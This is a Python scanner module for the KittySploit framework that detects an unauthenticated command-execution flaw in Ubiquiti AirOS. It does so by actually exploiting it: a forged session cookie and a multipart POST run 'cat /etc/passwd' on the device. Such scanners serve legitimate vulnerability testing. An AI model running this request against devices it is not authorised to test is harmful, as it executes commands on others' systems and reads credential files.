#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects AirOS unauth RCE by POSTing multipart exec=cat /etc/passwd&action=cli to /admin."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ubiquiti AirOS - Unauthenticated CLI RCE Detection',
        'description': (
            'Detects AirOS unauth RCE by POSTing multipart exec=cat /etc/passwd&action=cli to /admin.cgi/sd.css with a forged AIROS_SESSIONID cookie.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'ubiquiti', 'airos', 'rce', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.securityfocus.com/bid/51178',
        ],
    }

    def run(self):
        boundary = '---------------------------15531490717347903902081461200'
        body = (
            f'--{boundary}\r\n'
            'Content-Disposition: form-data; name="exec"\r\n\r\n'
            'cat /etc/passwd\r\n'
            f'--{boundary}\r\n'
            'Content-Disposition: form-data; name="action"\r\n\r\n'
            'cli\r\n'
            f'--{boundary}--\r\n'
        )
        headers = {
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'Cookie': 'AIROS_SESSIONID=a447a1b693b321f598389d6972ab5c18; ui_language=pt_PT',
        }
        for path in ('/admin.cgi/sd.css', '/adm.cgi/sd.css'):
            probe = self.http_request(method='GET', path=path, allow_redirects=False)
            if not probe or 'Device administration utility' not in (probe.text or ''):
                continue
            r = self.http_request(method='POST', path=path, data=body, headers=headers, allow_redirects=False)
            if r and re.search(r'root:.*:0:0:', r.text or ''):
                self.set_info(severity='critical', reason='Ubiquiti AirOS unauthenticated CLI RCE', path=path)
                return True
        return False

